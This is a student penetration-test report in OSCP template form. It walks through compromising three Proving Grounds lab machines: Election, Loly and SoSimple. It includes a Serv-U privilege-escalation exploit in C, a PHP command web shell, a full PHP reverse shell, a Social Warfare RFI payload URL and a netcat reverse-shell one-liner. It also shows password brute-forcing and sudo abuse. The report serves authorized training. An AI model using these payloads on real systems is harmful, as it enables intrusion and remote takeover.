---
title: "Offensive Proving Grounds Play Test"
author: [ "ARZ"]
date: "2022-09-13"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "PGP Report"
lang: "en"
titlepage: true
titlepage-color: "FFD700"
titlepage-text-color: "000000"
titlepage-rule-color: "000000"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Offensive Security Proving Grounds Play Test

## Introduction

Offensive Security Proving Grounds Play penetration test report contains all efforts that were conducted in order to pass the OSCP exam.
This report should contain all lab data in the report template format as well as all items that were used to pass the overall exam.
This report will be graded from a standpoint of correctness and fullness to all aspects of the test.
The purpose of this report is to ensure that the candidate has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the OSCP exam.

## Objective

The objective of this assessment is to perform an internal penetration test against the Offensive Security Lab network.
The student is tasked with following methodical approach in obtaining access to the objective goals.
This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report.

## Requirements

The candidate will be required to fill out this penetration testing report fully and to include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.
- Any additional items that were not included

# High-Level Summary

I was tasked with performing an internal penetration test towards Offensive Security Labs.
An internal penetration test is a dedicated attack against internally connected systems.
The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security's internal lab systems.
My overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security's network.
When performing the attacks, I was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.
During the testing, I had administrative level access to multiple systems.
All systems were successfully exploited and access granted.
These systems as well as a brief description on how access was obtained are listed below:

- Election - Got access through leaked credentials and logging through SSH
- Loly - Got access through weak credenitals and unrestricted file upload
- SoSimple - Got access through unauthenticated remote code execution

## Recommendations

I recommend patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future.
One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodologies

I utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Lab environments are secure.
Below is a breakout of how I was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

## Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, I was tasked with exploiting the lab and exam network.
The specific IP addresses were:

**Lab Network**

192.168.123.211, 192.168.53.121, 192.168.123.78

## Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.

This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.

Server IP Address | Ports Open
------------------|----------------------------------------
192.168.123.211   | **TCP**: 22,80
192.168.53.121    | **TCP**: 80
192.168.123.78    | **TCP**: 22,80

## Penetration

The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems.
During this penetration test, I was able to successfully gain access to 3 out of the 3 systems.

### Vulnerability Exploited: Leaked Credentials

#### System Vulnerable: 192.168.123.211

**Vulnerability Explanation:**

Credentials were found from /eletcion/admin/logs hainvg system.log which were usable on SSH for love user

**Privilege Escalation Vulnerability Explanation:**
A privilege escalation vulnerability exists in SolarWinds Serv-U before 15.1.7 for Linux, The Serv-U executable is setuid root, and uses ARGV[0] in a call to system(), without validation, when invoked with the -prepareinstallationE flag, resulting in command execution with root privilege.

**Vulnerability Fix:**

- Remove the log file from /election/admin/logs, whitelist access to logs directory also update the password for love user.
  
- A patch has been issued by solarwinds to upgrade to Serv-U 15.1.7.

**Severity:** Critical

**Proof of Concept :**

- https://www.exploit-db.com/exploits/47009

**Steps to Exploit System**

##### Enumeration


Starting off with an nmap scan 

```bash
Nmap scan report for 192.168.123.211
Host is up (0.15s latency).
Not shown: 805 closed tcp ports (reset), 193 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see two ports, ssh and http, ssh wasn't vulnerable so moving onto the web server


![](https://i.imgur.com/bHeyTaI.png)

It was showing apache2 default web page which led to fuzzing for files and directories using gobuster

```bash
gobuster dir -u 'http://192.168.123.211/' -w /usr/share/wordlists/dirb/common.txt
```

![](https://i.imgur.com/nzNNQk1.png)

This found some interesting stuff like, phpinfo.php, robots.txt and phpmyadmin, I tried accessing phpmyadmin with default credentials but got access denied

![](https://i.imgur.com/xPnYpaN.png)

The phpinfo page didn't show much other than the version which wasn't exploitable

![](https://i.imgur.com/W194IhI.png)

And lastly robots.txt showed some directory names

![](https://i.imgur.com/SZkcOCN.png)

Out of which election directory existed which brought us to an application

![](https://i.imgur.com/jotW3E6.png)

Fuzzing on this page revealed /admin

![](https://i.imgur.com/asaKdDR.png)

Which showed an admin login panel, there I tried default credentials and performed basic sql injection payload but it didn't worked

![](https://i.imgur.com/cjIt0e8.png)

![](https://i.imgur.com/Hopo179.png)

I started fuzzing on /admin and found /logs  

![](https://i.imgur.com/GitRa6y.png)

This directory had a file named system.log

![](https://i.imgur.com/7anAuMo.png)

Which had credentials `love:P@$$w0rd@123` 

![](https://i.imgur.com/RtbbdNr.png)

##### Foothold

Using these credentials on SSH gave us access to the machine

![](https://i.imgur.com/ezEroWj.png)

On further enumeration of the machine, there's a card.php in /var/www/html which has text in binary form which we can convert it to ASCII

![](https://i.imgur.com/P86rhuf.png)

![](https://i.imgur.com/LK9bzQd.png)

![](https://i.imgur.com/DuDrhmg.png)

![](https://i.imgur.com/wfSkJpS.png)

But these credentials only work on the election admin panel which isn't useful now as we already have access on the machine

##### Gaining Root Access

Looking for SUID binaries we do find one unusual binary named Serv-U by using this command

```bash
find / -perm /4000 2>/dev/null
```

![](https://i.imgur.com/iwLtDUU.png)

Serv-U is an FTP server, Luckliy this was exploitable as there was a CVE for this CVE-2019-12181

![](https://i.imgur.com/DyfjEFG.png)

Using the poc from exploit-db we can compile this c code on the target machine

```c
#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{       
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    // if execv is successful, we won't reach here
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}
```

Compile it with gcc

```bash
gcc -o test ./test.c
```

![](https://i.imgur.com/yFRIxJM.png)

And after compiling it into a binary, simply just execute after making it an executable with chmod +x, We'll get a root shell

![](https://i.imgur.com/IcCPbmh.png)

![](https://i.imgur.com/usYWkl4.png)

### Vulnerability Exploited: Weak Credentials and Adrotate 5.8.24 - Unrestricted File Upload

#### System Vulnerable: 192.168.53.121

**Vulnerability Explanation:** 

Brute forcing against  loly user was possible which granted access to wordpress administrator dashboard, also adroate version 5.8.24 was vulnerable to unrestricted file upload which allowed uploading php file in zip archive to get command execution in the context of www-data user.

 **Privilege Escalation Vulnerability Explanation:**

 Packet Filter (BPF) implementation in the Linux kernel 4.4 improperly performed sign extension in some situations. A local attacker could use this to cause a denial of service (system crash) or possibly execute arbitrary code.

**Vulnerability Fix:** 

- Use strong password for loly user
  
- Update the adrotate plugin to version 5.8.26 
  
- Update linux kernel to the latest version
  
**Severity:** Critical

**Proof of Concept Code:**

- https://www.exploit-db.com/exploits/45010

**Steps to Exploit System**

##### Enumeration

Starting with an namp scan, we see only one service running which is http

```bash
Nmap scan report for 192.168.53.121
Host is up (0.35s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The web page only shows a default installation page 

![](https://i.imgur.com/bm6LaDY.png)

So this leads us to fuzzing for files and directories with gobuster

```bash
gobuster dir -u 'http://192.168.53.121/' -w /usr/share/wordlists/dirb/common.txt 
```

![](https://i.imgur.com/YbYDyFL.png)

This finds /wordpress , on visiting this directory it will load the wordpress site, Now the css doesn't look like it's working here and the reason for that is, if we check the source, css files are being fetched from loly.lc

![](https://i.imgur.com/i1FqFec.png)

We can add this domain in /etc/hosts file

![](https://i.imgur.com/tfC4WMg.png)

On loading the page we'll get the proper wordpress page

![](https://i.imgur.com/d3xkTJO.png)

To enumerate wordpress, we can use wp-scan to enumerate users and plugins 

```bash
wpscan --url 'http://192.168.53.121/wordpress/' -eu 
```

![](https://i.imgur.com/ix39qIp.png)

This finds loly user which we can try to brute force this user's password

![](https://i.imgur.com/bbGD2rI.png)

Now Scanning for plugins 

![](https://i.imgur.com/uDQ12A6.png)

This didn't showed any plugins being used, so this leaves us to brute forcing the password for loly as the last resort

```bash
wpscan --url 'http://192.168.53.121/wordpress/' -U 'loly' -P /usr/share/wordlists/rockyou.txt
```

![](https://i.imgur.com/dG2LFCT.png)
|
This brute forces the password fernando which we can use to login into the dashboard

![](https://i.imgur.com/j5fROcg.png)

After logging in we are presented with an admin dashboard as loly has the role of a wordpress administrator 

##### Foothold

From here uploading a theme, plugin or editing a template wasn't available to us from which we can upload a reverse shell but the plugin adroate had an option to upload an advert but php files aren't allowed

But it does say that it extracts the file from zip, so what if we upload a zip file having a php file also the uploaded files will go to /wordpress/wp-content/banners

![](https://i.imgur.com/fIi78Jy.png)

we have our php file 

```bash
<?php system($_GET['cmd']); ?>
```

![](https://i.imgur.com/lMbAxud.png)

Now to upload this zip file 

![](https://i.imgur.com/inCHFya.png)

After uploading it, we'll visit the link http://loly.lc/wordpress/wp-content/banners/file.php?cmd=id

![](https://i.imgur.com/9oS2mYo.png)

We have remote code execution, only thing now left is to get a reverse shell but I had trouble getting the one liners to work to for bash, php and nc for reverse shell so instead I used pentest monkey php reverse shell

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'IP';
$port = 2222;     
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

![](https://i.imgur.com/yDBR11s.png)

This gives us a reverse shell as www-data

<img src="https://i.imgur.com/gY9Plxw.png"/>

##### Privilege Escalation
After stabilizing our shell we can start enumerating the machine for escalating our privileges to a user and for that we can find config.php from /var/www/html/wordpress which has the credentials to mysql database

![](https://i.imgur.com/PSv7BPQ.png)

We can try re using this password for loly user on the machine which works 

![](https://i.imgur.com/lNGMTDL.png)

##### Gaining Root Access

Through sudo -l I tried to see if there's any binary which this user can run with root privileges but it seems that this user isn't in sudoers group

![](https://i.imgur.com/6qZjFwU.png)

hecking the kernel version with uname -avr it's running a very old kernel version 4.4.0-31 which may be vulnerable

<img src="https://i.imgur.com/vXhkaDw.png"/>

Searching for an exploit on exploit-db 

![](https://i.imgur.com/afig4Vk.png)

It shows that it has been tested on the exact kernel version so chances are we can get a root shell through this, on compiling and executing the binary we'll get a root shell

![](https://i.imgur.com/7vseAnj.png)

![](https://i.imgur.com/7Uw6W9S.png)

### Vulnerability Exploited: Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)

#### System Vulnerable: 192.168.123.78

**Vulnerability Explanation:**

Social Warfare is a wordpress plugin, which the version < = 3.5.2 is vulnerable to Unauthenticated Remote Code Execution (RCE) by including the php code through Remote File Inclusion (RFI) in swp_url GET parameter.

**Privilege Escalation Vulnerability Explanation:**
Service binary is reponsible for running a init script or running a service job buf if it can be misued as well by spawning a bash shell
Steven user can run health.sh as a root user which can read to executing commands and can give root privileges

**Vulnerability Fix:** 

- Update the Social Warfare plugin to version 3.5.3 or later through the administrative dashboard.
  
- Remove sudoers entry for max user which can lead to escalating to higher privileges.
  
- Remove sudoers entry for steven user from executing health.sh also remove access from /opt directory for this user.

**Severity:** Critical

**Proof of Concept Code:**

 - https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618
 - https://gtfobins.github.io/gtfobins/service/
   
**Steps to Exploit System**

##### Enumeration
Running nmap scan, we see three services running, ssh, dns and http

```bash
Nmap scan report for 192.168.123.78
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b:55:43:ef:af:d0:3d:0e:63:20:7a:f4:ac:41:6a:45 (RSA)
|   256 53:f5:23:1b:e9:aa:8f:41:e2:18:c6:05:50:07:d8:d4 (ECDSA)
|_  256 55:b7:7b:7e:0b:f5:4d:1b:df:c3:5d:a1:d7:68:a9:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: So Simple
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The web servers shows only an image on the web page and nothing else

![](https://i.imgur.com/ACQ2EMQ.png)

Fuzzing for files and directories with gobuster reveals wordpress directory

```bash
gobuster dir -u 'http://192.168.123.78'
```

![](https://i.imgur.com/3IAYD8Z.png)

![](https://i.imgur.com/FAnYp6o.png)

We can start enumerating wordpress through wp-scan to scan for plugins and usernames

```bash
wpscan --url 'http://192.168.123.78/wordpress/' -eu
```

This finds two users admin and max

![](https://i.imgur.com/nlDpXCx.png()

On enumerating plugins it finds two of them as well

```bash
wpscan --url 'http://192.168.123.78/wordpress/' -ep  
```

![](https://i.imgur.com/saJoLqM.png)

Social warfare and Simple-cart-solution

##### Foothold

We can search for exploits related to these plugins out of which Social Warfare was vulnerable to unauthenticated remote code execution

![](https://i.imgur.com/kuLPBtd.png)

Following the proof of concept, we need to host the payload which will have any command, here I'll show the output of id command and through RFI on swap_url, it will accept that file as input and will execute it through system function

The payload file have this content 

```bash
<pre>system('id')</pre>
```

![](https://i.imgur.com/HHDNesE.png)

Hosting it through "python3 -m http.server 3333", making a request to this url with our payload file

```bash
http://192.168.123.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.49.123:3333/payload.txt
```

![](https://i.imgur.com/sxVhI33.png)

We get a request on our python server and on the web page we'll get the ouput of id command 

![](https://i.imgur.com/aW9z6ej.png)

Now that we have confirmed there's RCE we can get a reverse shell and for that we'll use netcat busybox one-liner as by default busybox version of netcat is available

```bash
<pre>system('rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.123 2222 >/tmp/f')</pre>
```

![](https://i.imgur.com/ahtVT52.png)

Stabilizing the shell with python3 so that we can get make our reverse shell better with the arrow key and tab completion functionality

![](https://i.imgur.com/LgukCiR.png)

##### Privilege Escalation

We can access max's directory which had .ssh hiden directory having the private key

![]https://i.imgur.com/HVRCnR6.png)

We can transfer that onto our local machine and use it through SSH to login but before that we want to change the permissions of that file to read and write only by our current user with chmod 600

![](https://i.imgur.com/AaRQnpl.png)

![](https://i.imgur.com/Xcdz8bH.png)

Doing sudo -l will show that max can run service with steven user, we can check the abuse from GTFOBINS to escalate our privileges 

![](https://i.imgur.com/NGnMRV5.png)

![](https://i.imgur.com/YGperAv.png)

```bash
sudo -u steven /usr/sbin/service ../../bin/bash
```

![](https://i.imgur.com/BdWBxXU.png)

##### Gaining Root Access

Doing sudo -l again with steven will show that we can run /opt/tools/server-health.sh as a root user

!{](https://i.imgur.com/9kkB5kD.png)

But this file doesn't exist on checking with ls 

![](https://i.imgur.com/4YUgXNY.png()

If we check the permissions on /opt directory, steven is the owner of this directory which means we can create this file and execute whatever we want as a root user, so here I just added bash command which will spawn bash shell as root on executing the file

![](https://i.imgur.com/JQQE5sv.png)

Now just execute this script with sudo and we'll get the root shell

```bash
sudo /opt/tools/server-health.sh
```

![](https://i.imgur.com/Y9qf2AC.png)

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

I added administrator and root level accounts on all systems compromised.
In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.

## House Cleaning
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After the trophies on the exam network were completed, I removed all user accounts and passwords as well as the meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.
